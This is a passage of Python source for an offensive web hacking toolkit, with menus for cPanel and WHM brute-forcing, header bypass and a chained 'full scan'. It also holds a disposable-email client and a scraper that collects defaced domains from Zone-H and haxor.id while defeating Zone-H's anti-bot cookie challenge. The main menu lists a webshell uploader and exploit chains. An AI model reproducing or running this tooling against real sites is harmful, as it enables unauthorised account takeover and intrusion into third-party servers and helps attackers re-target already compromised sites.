                                    "\n".join(dbs[:10]), CURRENT_USER)
        except Exception:
            pass
    if hits:
        _result_box("DATABASES FOUND", [f"{GRN}{d}{RST}" for d in set(hits)])
    else:
        _clean("No databases exposed via cPanel API")
    _pause(); return hits

def cpanel_full_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return
    _info(f"cPanel Full Scan → {target}")
    print(BLU + "\n  [01/08] Port Scan...\n" + RST)
    cpanel_port_scan(target)
    print(BLU + "\n  [02/08] Path Finder...\n" + RST)
    cpanel_path_finder(target)
    print(BLU + "\n  [03/08] Version Detect...\n" + RST)
    cpanel_version_detect(target)
    print(BLU + "\n  [04/08] Brute-Force cPanel...\n" + RST)
    cpanel_brute(target)
    print(BLU + "\n  [05/08] WHM Brute-Force...\n" + RST)
    cpanel_whm_brute(target)
    print(BLU + "\n  [06/08] Header Bypass...\n" + RST)
    cpanel_header_bypass(target)
    print(BLU + "\n  [07/08] API Scan...\n" + RST)
    cpanel_api_scan(target)
    print(BLU + "\n  [08/08] File Manager Check...\n" + RST)
    cpanel_filemanager_check(target)
    _clean("cPanel Full Scan complete")
    _pause()

def cpanel_menu(target=None):
    while True:
        _banner()
        if target:
            print(f"{BLU}\n  target: {target}\n{RST}")
        _menu_box_split("CPANEL TOOLS",[
            "[01]  cPanel Port Scan",
            "[02]  cPanel Path Finder",
            "[03]  cPanel Version Detect",
            "[04]  cPanel Brute-Force",
            "[05]  WHM Brute-Force",
            "[06]  Header Bypass",
            "[07]  cPanel API Scan",
            "[08]  File Manager Check",
            "[09]  Email Account Enum",
            "[10]  Database Scanner",
            "[11]  Full cPanel Scan",
            "[00]  Back",
        ], divider_after={5})
        ch  = _ask("cpanel-option").strip()
        url = (target or
               (_ask("target-url").strip() if ch not in ("0","") else ""))
        if not url and ch not in ("0",""):
            continue
        if   ch == "1":  cpanel_port_scan(url)
        elif ch == "2":  cpanel_path_finder(url)
        elif ch == "3":  cpanel_version_detect(url)
        elif ch == "4":  cpanel_brute(url)
        elif ch == "5":  cpanel_whm_brute(url)
        elif ch == "6":  cpanel_header_bypass(url)
        elif ch == "7":  cpanel_api_scan(url)
        elif ch == "8":  cpanel_filemanager_check(url)
        elif ch == "9":  cpanel_email_enum(url)
        elif ch == "10": cpanel_db_scan(url)
        elif ch == "11": cpanel_full_scan(url)
        elif ch in ("0",""): break
        else: time.sleep(0.3)


def _strip_html(h):
    return re.sub(r"<[^>]+>", "", h or "")


class _GuerrillaAPI:

    _base = "https://api.guerrillamail.com/ajax.php"
    _sess_token = ""
    _email = ""
    _seq   = 0

    def _r(self, **params):
        try:
            p = {"lang": "en", **params}
            if self._sess_token:
                p["sid_token"] = self._sess_token
            r = requests.get(self._base, params=p, timeout=12)
            return r.json() if r.ok else {}
        except Exception:
            return {}

    def get_email(self):
        d = self._r(f="get_email_address")
        self._sess_token = d.get("sid_token", self._sess_token)
        self._email = d.get("email_addr", "")
        self._seq   = 0
        return self._email

    def set_email(self, addr):
        user = addr.split("@")[0] if "@" in addr else addr
        d = self._r(f="set_email_user", email_user=user)
        self._sess_token = d.get("sid_token", self._sess_token)
        self._email = d.get("email_addr", self._email)
        return self._email

    def get_inbox(self):
        d = self._r(f="get_email_list", offset=0, seq=self._seq)
        self._sess_token = d.get("sid_token", self._sess_token)
        mails = d.get("list", []) or []
        if mails:
            self._seq = int(mails[0].get("mail_id", self._seq))
        return [
            {
                "id":      m.get("mail_id",""),
                "from":    m.get("mail_from",""),
                "subject": _strip_html(m.get("mail_subject","")),
                "date":    m.get("mail_date",""),
                "read":    m.get("mail_read","0") == "1",
            }
            for m in mails
        ]

    def read_mail(self, mail_id):
        d = self._r(f="fetch_email", email_id=mail_id)
        self._sess_token = d.get("sid_token", self._sess_token)
        return {
            "from":    d.get("mail_from",""),
            "subject": _strip_html(d.get("mail_subject","")),
            "body":    _strip_html(d.get("mail_body","")),
            "date":    d.get("mail_date",""),
        }

    def delete_mail(self, mail_ids):
        self._r(f="del_email", email_ids=",".join(str(i) for i in mail_ids))

    def forget_me(self):
        self._r(f="forget_me")
        self._email = ""
        self._sess_token = ""

    def get_domains(self):
        return ["guerrillamailblock.com","grr.la","guerrillamailblock.com","spam4.me"]

    @property
    def name(self):
        return "GuerrillaMail"

    @property
    def current_email(self):
        return self._email


class _MailTmAPI:

    _base    = "https://api.mail.tm"
    _token   = ""
    _account = {}

    def _h(self):
        h = {"Content-Type":"application/json","Accept":"application/json"}
        if self._token:
            h["Authorization"] = f"Bearer {self._token}"
        return h

    def _get(self, path, **kw):
        try:
            r = requests.get(f"{self._base}{path}", headers=self._h(), timeout=12, **kw)
            return r.json() if r.ok else {}
        except Exception:
            return {}

    def _post(self, path, data):
        try:
            r = requests.post(f"{self._base}{path}", headers=self._h(), json=data, timeout=12)
            return r.json() if r.ok else {}
        except Exception:
            return {}

    def _delete(self, path):
        try:
            requests.delete(f"{self._base}{path}", headers=self._h(), timeout=12)
        except Exception:
            pass

    def get_domains(self):
        d = self._get("/domains", params={"page":1})
        return [x.get("domain","") for x in d.get("hydra:member",[])]

    def get_email(self, user=None, passwd=None):
        doms = self.get_domains()
        domain = doms[0] if doms else "mail.tm"
        if not user:
            user = "".join(random.choices(string.ascii_lowercase+string.digits, k=10))
        if not passwd:
            passwd = "".join(random.choices(string.ascii_letters+string.digits, k=16))
        addr = f"{user}@{domain}"
        d = self._post("/accounts", {"address": addr, "password": passwd})
        if "id" in d:
            self._account = {"address": addr, "password": passwd, "id": d["id"]}
            td = self._post("/token", {"address": addr, "password": passwd})
            self._token = td.get("token","")
        return self._account.get("address","")

    def set_email(self, addr):
        return addr

    @property
    def current_email(self):
        return self._account.get("address","")

    def get_inbox(self):
        d = self._get("/messages", params={"page":1})
        items = d.get("hydra:member",[]) or []
        return [
            {
                "id":      m.get("id",""),
                "from":    m.get("from",{}).get("address",""),
                "subject": m.get("subject",""),
                "date":    m.get("createdAt",""),
                "read":    m.get("seen",False),
            }
            for m in items
        ]

    def read_mail(self, mail_id):
        d = self._get(f"/messages/{mail_id}")
        return {
            "from":    d.get("from",{}).get("address",""),
            "subject": d.get("subject",""),
            "body":    _strip_html(d.get("html",[""])[0] if d.get("html") else d.get("text","")),
            "date":    d.get("createdAt",""),
        }

    def delete_mail(self, mail_ids):
        for i in mail_ids:
            self._delete(f"/messages/{i}")

    def forget_me(self):
        if self._account.get("id"):
            self._delete(f"/accounts/{self._account['id']}")
        self._account = {}
        self._token   = ""

    @property
    def name(self):
        return "mail.tm"


class _MailGwAPI:

    _base    = "https://api.mail.gw"
    _token   = ""
    _account = {}

    def _h(self):
        h = {"Content-Type":"application/json","Accept":"application/json"}
        if self._token:
            h["Authorization"] = f"Bearer {self._token}"
        return h

    def _get(self, path, **kw):
        try:
            r = requests.get(f"{self._base}{path}", headers=self._h(), timeout=12, **kw)
            return r.json() if r.ok else {}
        except Exception:
            return {}

    def _post(self, path, data):
        try:
            r = requests.post(f"{self._base}{path}", headers=self._h(), json=data, timeout=12)
            return r.json() if r.ok else {}
        except Exception:
            return {}

    def _delete(self, path):
        try:
            requests.delete(f"{self._base}{path}", headers=self._h(), timeout=12)
        except Exception:
            pass

    def get_domains(self):
        d = self._get("/domains", params={"page":1})
        return [x.get("domain","") for x in d.get("hydra:member",[])]

    def get_email(self, user=None, passwd=None):
        doms = self.get_domains()
        domain = doms[0] if doms else "mail.gw"
        if not user:
            user = "".join(random.choices(string.ascii_lowercase+string.digits, k=10))
        if not passwd:
            passwd = "".join(random.choices(string.ascii_letters+string.digits, k=16))
        addr = f"{user}@{domain}"
        d = self._post("/accounts", {"address": addr, "password": passwd})
        if "id" in d:
            self._account = {"address": addr, "password": passwd, "id": d["id"]}
            td = self._post("/token", {"address": addr, "password": passwd})
            self._token = td.get("token","")
        return self._account.get("address","")

    def set_email(self, addr):
        return addr

    @property
    def current_email(self):
        return self._account.get("address","")

    def get_inbox(self):
        d = self._get("/messages", params={"page":1})
        items = d.get("hydra:member",[]) or []
        return [
            {
                "id":      m.get("id",""),
                "from":    m.get("from",{}).get("address",""),
                "subject": m.get("subject",""),
                "date":    m.get("createdAt",""),
                "read":    m.get("seen",False),
            }
            for m in items
        ]

    def read_mail(self, mail_id):
        d = self._get(f"/messages/{mail_id}")
        return {
            "from":    d.get("from",{}).get("address",""),
            "subject": d.get("subject",""),
            "body":    _strip_html(d.get("html",[""])[0] if d.get("html") else d.get("text","")),
            "date":    d.get("createdAt",""),
        }

    def delete_mail(self, mail_ids):
        for i in mail_ids:
            self._delete(f"/messages/{i}")

    def forget_me(self):
        if self._account.get("id"):
            self._delete(f"/accounts/{self._account['id']}")
        self._account = {}
        self._token   = ""

    @property
    def name(self):
        return "mail.gw"


class _OneSecMailAPI:

    _base  = "https://www.1secmail.com/api/v1/"
    _email = ""
    _user  = ""
    _dom   = ""

    def get_domains(self):
        try:
            r = requests.get(f"{self._base}", params={"action":"getDomainList"}, timeout=12)
            return r.json() if r.ok else ["1secmail.com","1secmail.org","1secmail.net"]
        except Exception:
            return ["1secmail.com","1secmail.org","1secmail.net"]

    def get_email(self, user=None, domain=None):
        doms = self.get_domains()
        self._dom  = domain or (doms[0] if doms else "1secmail.com")
        self._user = user  or "".join(random.choices(string.ascii_lowercase+string.digits, k=10))
        self._email = f"{self._user}@{self._dom}"
        return self._email

    def set_email(self, addr):
        if "@" in addr:
            self._user, self._dom = addr.split("@", 1)
            self._email = addr
        return self._email

    @property
    def current_email(self):
        return self._email

    def get_inbox(self):
        if not self._user or not self._dom:
            return []
        try:
            r = requests.get(self._base, params={
                "action":"getMessages","login":self._user,"domain":self._dom
            }, timeout=12)
            items = r.json() if r.ok else []
        except Exception:
            items = []
        return [
            {
                "id":      m.get("id",""),
                "from":    m.get("from",""),
                "subject": m.get("subject",""),
                "date":    m.get("date",""),
                "read":    False,
            }
            for m in (items or [])
        ]

    def read_mail(self, mail_id):
        try:
            r = requests.get(self._base, params={
                "action":"readMessage","login":self._user,
                "domain":self._dom,"id":mail_id
            }, timeout=12)
            d = r.json() if r.ok else {}
        except Exception:
            d = {}
        return {
            "from":    d.get("from",""),
            "subject": d.get("subject",""),
            "body":    _strip_html(d.get("htmlBody","") or d.get("textBody","")),
            "date":    d.get("date",""),
        }

    def delete_mail(self, mail_ids):
        pass

    def forget_me(self):
        self._email = ""
        self._user  = ""
        self._dom   = ""

    @property
    def name(self):
        return "1SecMail"


class _TempMailPlusAPI:

    _base    = "https://tempmail.plus/api"
    _email   = ""
    _eml_id  = ""

    def get_domains(self):
        try:
            r = requests.get(f"{self._base}/mails/domains", timeout=12)
            d = r.json() if r.ok else {}
            return d.get("domains", ["tempmail.plus"])
        except Exception:
            return ["tempmail.plus"]

    def get_email(self, user=None):
        if not user:
            user = "".join(random.choices(string.ascii_lowercase+string.digits, k=10))
        doms = self.get_domains()
        dom  = doms[0] if doms else "tempmail.plus"
        self._email  = f"{user}@{dom}"
        self._eml_id = user
        return self._email

    def set_email(self, addr):
        if "@" in addr:
            self._eml_id = addr.split("@")[0]
        self._email = addr
        return self._email

    @property
    def current_email(self):
        return self._email

    def get_inbox(self):
        if not self._eml_id:
            return []
        try:
            r = requests.get(f"{self._base}/mails", params={"email":self._email,"limit":20}, timeout=12)
            d = r.json() if r.ok else {}
            items = d.get("mail_list",[]) or []
        except Exception:
            items = []
        return [
            {
                "id":      m.get("mail_id",""),
                "from":    m.get("from_mail",""),
                "subject": m.get("subject",""),
                "date":    m.get("date",""),
                "read":    m.get("is_new", True) is False,
            }
            for m in items
        ]

    def read_mail(self, mail_id):
        try:
            r = requests.get(f"{self._base}/mails/{mail_id}", params={"email":self._email}, timeout=12)
            d = r.json() if r.ok else {}
        except Exception:
            d = {}
        return {
            "from":    d.get("from_mail",""),
            "subject": d.get("subject",""),
            "body":    _strip_html(d.get("html","") or d.get("text","")),
            "date":    d.get("date",""),
        }

    def delete_mail(self, mail_ids):
        for i in mail_ids:
            try:
                requests.delete(f"{self._base}/mails/{i}", params={"email":self._email}, timeout=12)
            except Exception:
                pass

    def forget_me(self):
        try:
            requests.delete(f"{self._base}/mails/all", params={"email":self._email}, timeout=12)
        except Exception:
            pass
        self._email  = ""
        self._eml_id = ""

    @property
    def name(self):
        return "TempMail+"


_gm_api = _GuerrillaAPI()
_mt_api = _MailTmAPI()
_mg_api = _MailGwAPI()
_os_api = _OneSecMailAPI()
_tp_api = _TempMailPlusAPI()
_TM_APIS = [_gm_api, _mt_api, _mg_api, _os_api, _tp_api]
_tm_active_api = _gm_api


def _tm_draw_addr():
    addr = _tm_active_api.current_email or "(none — generate first)"
    print(BLU +
        f"  ╔══════════════════════════════════════════════════╗\n"
        f"  ║  ACTIVE ADDRESS                                  ║\n"
        f"  ╠══════════════════════════════════════════════════╣\n"
        f"  ║  API  : {_tm_active_api.name:<41}║\n"
        f"  ║  Mail : {addr:<41}║\n"
        f"  ╚══════════════════════════════════════════════════╝" + RST
    )


def _tm_inbox_screen():
    _banner()
    _tm_draw_addr()
    print()
    _info("Fetching inbox...")
    try:
        msgs = _tm_active_api.get_inbox()
    except Exception as e:
        _err(f"Inbox fetch failed: {e}")
        _pause()
        return
    if not msgs:
        _warn("Inbox is empty.")
        _pause()
        return
    lines = []
    for i, m in enumerate(msgs[:20], 1):
        status = f"{GRN}[NEW]{RST}" if not m.get("read") else f"{DIM}[RD] {RST}"
        subject = (m.get("subject","(no subject)") or "(no subject)")[:34]
        sender  = (m.get("from","") or "")[:28]
        lines.append(f"  {status}  [{i:02d}]  {subject:<34}  from: {sender}")
    print("\n".join(lines))
    print()
    ch = _ask("read [number] or 0=back").strip()
    if ch in ("0",""):
        return
    try:
        idx = int(ch) - 1
        if 0 <= idx < len(msgs):
            _tm_read_screen(msgs[idx])
    except (ValueError, TypeError):
        pass


def _tm_read_screen(msg_meta):
    _banner()
    _info(f"Reading mail id={msg_meta['id']} ...")
    try:
        mail = _tm_active_api.read_mail(msg_meta["id"])
    except Exception as e:
        _err(f"Failed to read mail: {e}")
        _pause()
        return
    print(BLU +
        f"\n  ╔══════════════════════════════════════════════════╗\n"
        f"  ║  MAIL READER                                     ║\n"
        f"  ╠══════════════════════════════════════════════════╣\n"
        f"  ║  From    : {(mail.get('from','') or '')[:41]:<41}║\n"
        f"  ║  Subject : {(mail.get('subject','') or '')[:41]:<41}║\n"
        f"  ║  Date    : {(mail.get('date','') or '')[:41]:<41}║\n"
        f"  ╚══════════════════════════════════════════════════╝" + RST
    )
    body = (mail.get("body","") or "").strip()
    if body:
        print()
        for ln in body.splitlines()[:60]:
            print(f"  {DIM}{ln}{RST}")
    else:
        print(f"\n  {DIM}(no body content){RST}")
    print()
    _pause()


def _tm_gen_screen():
    global _tm_active_api
    _banner()
    _tm_draw_addr()
    print()
    _info("Generating new address...")
    try:
        addr = _tm_active_api.get_email()
        _found(f"New address: {addr}")
    except Exception as e:
        _err(f"Generation failed: {e}")
    _pause()


def _tm_custom_gen_screen():
    global _tm_active_api
    _banner()
    _tm_draw_addr()
    print()
    user = _ask("desired username (blank=random)").strip()
    _info("Setting custom address...")
    try:
        if hasattr(_tm_active_api, "set_email") and user:
            addr = _tm_active_api.set_email(user if "@" in user else _tm_active_api.get_email(user) if hasattr(_tm_active_api.get_email, "__code__") else user)
        else:
            addr = _tm_active_api.get_email(user or None)
        _found(f"Address set: {addr}")
    except Exception as e:
        _err(f"Failed: {e}")
    _pause()


def _tm_domains_screen():
    _banner()
    _info(f"Fetching domains for {_tm_active_api.name}...")
    try:
        doms = _tm_active_api.get_domains()
    except Exception as e:
        _err(f"Failed: {e}")
        _pause()
        return
    _box("AVAILABLE DOMAINS", [f"  {d}" for d in (doms or ["(none)"])])
    _pause()


def _tm_delete_screen():
    _banner()
    _info("Deleting current account / forgetting address...")
    try:
        _tm_active_api.forget_me()
        _found("Done. Address cleared.")
    except Exception as e:
        _err(f"Failed: {e}")
    _pause()


def _tm_refresh_screen():
    _banner()
    _tm_draw_addr()
    print()
    _info("Refreshing inbox (live watch — press Ctrl+C to stop)...")
    try:
        seen = set()
        for _ in range(20):
            msgs = _tm_active_api.get_inbox()
            for m in msgs:
                if m["id"] not in seen:
                    seen.add(m["id"])
                    _found(f"[NEW] {m.get('subject','(no subject)')[:50]}  from {m.get('from','')[:30]}")
            time.sleep(3)
        _info("Watch ended (20 cycles).")
    except KeyboardInterrupt:
        _info("Watch stopped.")
    _pause()


def _tm_clear_screen():
    _banner()
    _info("Clearing all inbox messages...")
    try:
        msgs = _tm_active_api.get_inbox()
        ids  = [m["id"] for m in msgs]
        if ids:
            _tm_active_api.delete_mail(ids)
            _found(f"Deleted {len(ids)} message(s).")
        else:
            _warn("Inbox already empty.")
    except Exception as e:
        _err(f"Failed: {e}")
    _pause()


def _tm_api_select():
    global _tm_active_api
    _banner()
    _menu_box("SELECT API", [
        f"[{i+1}]  {a.name}" for i, a in enumerate(_TM_APIS)
    ] + ["[0]  Back"])
    ch = _ask("api number").strip()
    if ch in ("0",""):
        return
    try:
        idx = int(ch) - 1
        if 0 <= idx < len(_TM_APIS):
            _tm_active_api = _TM_APIS[idx]
            _info(f"API switched to: {_tm_active_api.name}")
            time.sleep(0.5)
    except (ValueError, TypeError):
        pass


def tempmail_menu():
    while True:
        _banner()
        _tm_draw_addr()
        print()
        _menu_box_split("TEMPMAIL  coded by syke", [
            "[1]  Generate new address",
            "[2]  Custom username",
            "[3]  View inbox",
            "[4]  Live refresh (watch)",
            "[5]  View domains",
            "[6]  Clear inbox",
            "[7]  Delete account / forget",
            "[8]  Switch API",
            "[0]  Back",
        ], divider_after={})
        ch = _ask("tempmail").strip()
        if   ch == "1": _tm_gen_screen()
        elif ch == "2": _tm_custom_gen_screen()
        elif ch == "3": _tm_inbox_screen()
        elif ch == "4": _tm_refresh_screen()
        elif ch == "5": _tm_domains_screen()
        elif ch == "6": _tm_clear_screen()
        elif ch == "7": _tm_delete_screen()
        elif ch == "8": _tm_api_select()
        elif ch in ("0",""):
            break
        else:
            time.sleep(0.3)


def _grab_save(records, source):
    os.makedirs(OUT_DIR, exist_ok=True)
    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    fn = os.path.join(OUT_DIR, f"defacement_{source}_{ts}.txt")
    with open(fn, "w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")
    return fn


def _rnd_pages(pool_max, count):
    pool_max = max(pool_max, count)
    return random.sample(range(1, pool_max + 1), min(count, pool_max))


def _rnd_ua():
    return random.choice(USER_AGENTS) if USER_AGENTS else (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    )


def _zh_solve_cookie(session):
    if not _CRYPTO_OK:
        return False
    try:
        r = session.get(
            "https://www.zone-h.org/archive",
            headers={"User-Agent": _rnd_ua(), "Referer": "https://www.zone-h.org/"},
            timeout=15, verify=False,
        )
        m = re.search(
            r'toNumbers\("([0-9a-f]+)"\),b=toNumbers\("([0-9a-f]+)"\),c=toNumbers\("([0-9a-f]+)"\)',
            r.text,
        )
        if not m:
            return False
        key = bytes.fromhex(m.group(1))
        iv  = bytes.fromhex(m.group(2))
        ct  = bytes.fromhex(m.group(3))
        cv  = _AES.new(key, _AES.MODE_CBC, iv).decrypt(ct).hex()
        session.cookies.set("ZHE", cv, domain="www.zone-h.org")
        return True
    except Exception:
        return False


class _ZoneHGrabber:

    _rss_special = "https://www.zone-h.org/rss/specialdefacements"
    _rss_regular = "https://www.zone-h.org/rss/defacements"

    def fetch(self, pages=3, include_onhold=False):
        s = requests.Session()
        _zh_solve_cookie(s)
        headers = {
            "User-Agent": _rnd_ua(),
            "Referer":    "https://www.zone-h.org/",
            "Accept":     "application/rss+xml,text/xml,*/*",
        }
        results  = []
        feeds    = [self._rss_special]
        if include_onhold:
            feeds.append(self._rss_regular)
        seen = set()
        for feed_url in feeds:
            try:
                r = s.get(feed_url, headers=headers, timeout=14, verify=False)
                if r.status_code != 200 or len(r.text) < 200:
                    continue
                items = re.findall(r"<item>(.*?)</item>", r.text, re.S)
                for item in items:
                    raw_title = re.search(r"<title[^>]*>(.*?)</title>", item, re.S)
                    raw_date  = re.search(r"<pubDate>(.*?)</pubDate>", item, re.S)
                    raw_link  = re.search(r"<link[^>]*>(.*?)</link>|<guid[^>]*>(.*?)</guid>", item, re.S)
                    if not raw_title:
                        continue
                    domain_raw = re.sub(r"<!\[CDATA\[|\]\]>", "", raw_title.group(1)).strip()
                    domain     = re.sub(r"https?://", "", domain_raw).split("/")[0].strip()
                    date       = re.sub(r"<!\[CDATA\[|\]\]>", "", raw_date.group(1)).strip() if raw_date else ""
                    link_val   = ""
                    if raw_link:
                        link_val = (raw_link.group(1) or raw_link.group(2) or "").strip()
                        link_val = re.sub(r"<!\[CDATA\[|\]\]>", "", link_val).strip()
                    if domain and domain not in seen:
                        seen.add(domain)
                        results.append({
                            "date":   date,
                            "domain": domain,
                            "link":   link_val,
                            "source": "zone-h",
                            "type":   "onhold" if feed_url == self._rss_regular else "special",
                        })
            except Exception:
                pass
            time.sleep(random.uniform(0.5, 1.0))
        random.shuffle(results)
        return results

    @property
    def name(self):
        return "Zone-H"


class _ZoneXSecGrabber:

    _rss_special = "https://www.zone-h.org/rss/specialdefacements"

    def fetch(self, pages=3, include_onhold=False):
        s = requests.Session()
        _zh_solve_cookie(s)
        headers = {
            "User-Agent": _rnd_ua(),
            "Referer":    "https://www.zone-h.org/",
            "Accept":     "application/rss+xml,text/xml,*/*",
        }
        results = []
        seen    = set()
        page_pool = _rnd_pages(50, pages)
        for pg in page_pool:
            try:
                url = f"https://www.zone-h.org/rss/specialdefacements?page={pg}"
                r   = s.get(url, headers=headers, timeout=14, verify=False)
                if r.status_code != 200 or len(r.text) < 200:
                    r = s.get(self._rss_special, headers=headers, timeout=14, verify=False)
                if r.status_code != 200:
                    continue
                items = re.findall(r"<item>(.*?)</item>", r.text, re.S)
                for item in items:
                    raw_title = re.search(r"<title[^>]*>(.*?)</title>", item, re.S)
                    raw_date  = re.search(r"<pubDate>(.*?)</pubDate>", item, re.S)
                    if not raw_title:
                        continue
                    domain_raw = re.sub(r"<!\[CDATA\[|\]\]>", "", raw_title.group(1)).strip()
                    domain     = re.sub(r"https?://", "", domain_raw).split("/")[0].strip()
                    date       = re.sub(r"<!\[CDATA\[|\]\]>", "", raw_date.group(1)).strip() if raw_date else ""
                    if domain and domain not in seen:
                        seen.add(domain)
                        results.append({
                            "date":   date,
                            "domain": domain,
                            "source": "zone-h-special",
                            "type":   "special",
                        })
            except Exception:
                pass
            time.sleep(random.uniform(0.4, 0.9))
        random.shuffle(results)
        return results

    @property
    def name(self):
        return "Zone-H Special"


class _HaxoridGrabber:

    _base = "https://haxor.id/archive"
    _pool = 75

    def fetch(self, pages=3, include_onhold=False):
        headers = {
            "User-Agent": _rnd_ua(),
            "Referer":    "https://haxor.id/",
        }
        results   = []
        seen      = set()
        page_pool = _rnd_pages(self._pool, pages)
        for pg in page_pool:
            url = f"{self._base}?page={pg}"
            try:
                r = requests.get(url, headers=headers, timeout=14, verify=False)
                if r.status_code != 200:
                    continue
                rows = re.findall(r"<tr[^>]*>(.*?)</tr>", r.text, re.S)
                for row in rows:
                    cells = re.findall(r"<td[^>]*>(.*?)</td>", row, re.S)
                    if len(cells) < 3:
                        continue
                    date  = re.sub(r"<[^>]+>", "", cells[0]).strip()
                    notif = re.sub(r"<[^>]+>", "", cells[1]).strip()
                    if not re.match(r"\d{4}-\d{2}-\d{2}", date):
                        continue
                    dom_m = re.search(r'href=["\']?(https?://[^"\'>\s]+)', row)
                    if not dom_m:
                        continue
                    domain = re.sub(r"https?://", "", dom_m.group(1)).split("/")[0]
                    if domain and domain not in seen:
                        seen.add(domain)
                        results.append({
                            "date":   date,
                            "domain": domain,
                            "notif":  notif,
                            "source": "haxorid",
                            "page":   pg,
                            "type":   "recent",
                        })
            except Exception:
                pass
            time.sleep(random.uniform(0.4, 1.0))
        random.shuffle(results)
        return results

    @property
    def name(self):
        return "HaxorID"


_zh_grabber = _ZoneHGrabber()
_zx_grabber = _ZoneXSecGrabber()
_hx_grabber = _HaxoridGrabber()
_GRABBERS   = [_zh_grabber, _zx_grabber, _hx_grabber]
_gr_active  = _zh_grabber


def _gr_run(grabber, pages, include_onhold=False):
    _banner()
    oh_label = "YES" if include_onhold else "NO"
    print(BLU +
        f"\n  ╔══════════════════════════════════════════════════╗\n"
        f"  ║  {grabber.name:<49}║\n"
        f"  ╠══════════════════════════════════════════════════╣\n"
        f"  ║  Pages    : {pages:<39}║\n"
        f"  ║  Onhold   : {oh_label:<39}║\n"
        f"  ╚══════════════════════════════════════════════════╝\n" + RST
    )
    _info(f"Grabbing from {grabber.name} (random pages)...")
    results = grabber.fetch(pages, include_onhold)
    if not results:
        _warn("No results found.")
        _pause()
        return
    random.shuffle(results)
    _found(f"{len(results)} defacement record(s) found.")
    print()
    for i, rec in enumerate(results[:40], 1):
        domain  = rec.get("domain", "")[:50]
        date    = rec.get("date",   "")[:16]
        pg      = rec.get("page",   "?")
        rtype   = rec.get("type",   "")
        tag     = f"{DIM}[p{pg}]{RST}" if rtype != "onhold" else f"{YLW}[onhold]{RST}"
        print(f"  {GRN}[{i:03d}]{RST}  {domain:<50} {tag}  {DIM}{date}{RST}")
    if len(results) > 40:
        print(f"  {DIM}... and {len(results)-40} more{RST}")
    print()
    save = _ask("save results? [Y/n]").strip().lower()
    if save in ("", "y", "yes"):
        fn = _grab_save(results, grabber.name.lower().replace("-", ""))
        _info(f"Saved: {fn}")
    _pause()


def _gr_select():
    global _gr_active
    _banner()
    _menu_box("SELECT SOURCE", [
        f"[{i+1}]  {g.name}" for i, g in enumerate(_GRABBERS)
    ] + ["[0]  Back"])
    ch = _ask("source number").strip()
    if ch in ("0", ""):
        return
    try:
        idx = int(ch) - 1
        if 0 <= idx < len(_GRABBERS):
            _gr_active = _GRABBERS[idx]
            _info(f"Source set: {_gr_active.name}")
            time.sleep(0.4)
    except (ValueError, TypeError):
        pass


def _gr_all_random(pages, include_onhold=False):
    _banner()
    _info("Grabbing from all sources with random pages...")
    all_results = []
    for g in _GRABBERS:
        _info(f"  Fetching {g.name}...")
        res = g.fetch(pages, include_onhold)
        all_results.extend(res)
        _found(f"  {g.name}: {len(res)} records")
    seen  = set()
    dedup = []
    for r in all_results:
        key = r.get("domain", "")
        if key and key not in seen:
            seen.add(key)
            dedup.append(r)
    random.shuffle(dedup)
    _found(f"Total unique domains: {len(dedup)}")
    if dedup:
        fn = _grab_save(dedup, "all_random")
        _info(f"Saved: {fn}")
    _pause()


def grabber_menu():
    global _gr_active
    while True:
        _banner()
        print(BLU +
            f"\n  ╔══════════════════════════════════════════════════╗\n"
            f"  ║  DEFACEMENT GRABBER  coded by syke              ║\n"
            f"  ╠══════════════════════════════════════════════════╣\n"
            f"  ║  Active source : {_gr_active.name:<33}║\n"
            f"  ╚══════════════════════════════════════════════════╝\n" + RST
        )
        _menu_box_split("GRABBER MENU", [
            "[1]  Grab Recent      (Zone-H)",
            "[2]  Grab Recent      (ZoneXSec)",
            "[3]  Grab Recent      (HaxorID)",
            "[4]  Grab + Onhold    (Zone-H)",
            "[5]  Grab Active Source",
            "[6]  Grab All Sources — Random Mix",
            "[7]  Grab All + Onhold — Random Mix",
            "[8]  Switch Active Source",
            "[0]  Back",
        ], divider_after={})
        ch = _ask("grabber").strip()
        if ch in ("0", ""):
            break
        if ch in ("1", "2", "3"):
            g = _GRABBERS[int(ch) - 1]
            try:
                pages = max(1, int(_ask("pages [3]").strip() or "3"))
            except (ValueError, TypeError):
                pages = 3
            _gr_run(g, pages, include_onhold=False)
        elif ch == "4":
            try:
                pages = max(1, int(_ask("pages [3]").strip() or "3"))
            except (ValueError, TypeError):
                pages = 3
            _gr_run(_zh_grabber, pages, include_onhold=True)
        elif ch == "5":
            try:
                pages = max(1, int(_ask("pages [3]").strip() or "3"))
            except (ValueError, TypeError):
                pages = 3
            _gr_run(_gr_active, pages, include_onhold=False)
        elif ch == "6":
            try:
                pages = max(1, int(_ask("pages per source [3]").strip() or "3"))
            except (ValueError, TypeError):
                pages = 3
            _gr_all_random(pages, include_onhold=False)
        elif ch == "7":
            try:
                pages = max(1, int(_ask("pages per source [3]").strip() or "3"))
            except (ValueError, TypeError):
                pages = 3
            _gr_all_random(pages, include_onhold=True)
        elif ch == "8":
            _gr_select()
        else:
            time.sleep(0.3)


def main_menu():
    while True:
        _banner()
        print(_stats_bar())
        print()
        _menu_grid([
            "[1] Web Analysis",
            "[2] Vulnerability Scanner",
            "[3] Auth & Brute-Force",
            "[4] WordPress Toolkit",
            "[5] Recon & OSINT",
            "[6] Advanced Attacks",
            "[7] Webshell Uploader",
            "[8] Full Scan",
            "[9] Exploit Chain Presets",
            "[A] Results & Reports",
            "[B] Telegram Bot Manager",
            "[C] Configuration",
            "[D] Suggested Methods",
            "[E] Extras & New Modules",
            "[F] Admin Finder",
            "[G] Admin Scanner",
            "[H] cPanel Tools",
            "[I] TempMail",
            "[J] Defacement Grabber",
            "[K] Site Hooker",
            "[0] Exit",
        ], cols=3)
        ch = _ask("Choice").strip().upper()
        if ch == "1":
            url = _ask("target [blank=ask per-tool]").strip()
            web_menu(url or None)
        elif ch == "2":
            url = _ask("target [blank=ask per-tool]").strip()
            vuln_menu(url or None)
        elif ch == "3":
            url = _ask("target [blank=ask per-tool]").strip()
            auth_menu(url or None)
        elif ch == "4":
            url = _ask("target [blank=ask per-tool]").strip()
            wp_menu(url or None)
        elif ch == "5":
            url = _ask("target [blank=ask per-tool]").strip()
            recon_menu(url or None)
        elif ch == "6":
            url = _ask("target [blank=ask per-tool]").strip()
            advanced_menu(url or None)
        elif ch == "7":
            auto_webshell_upload()
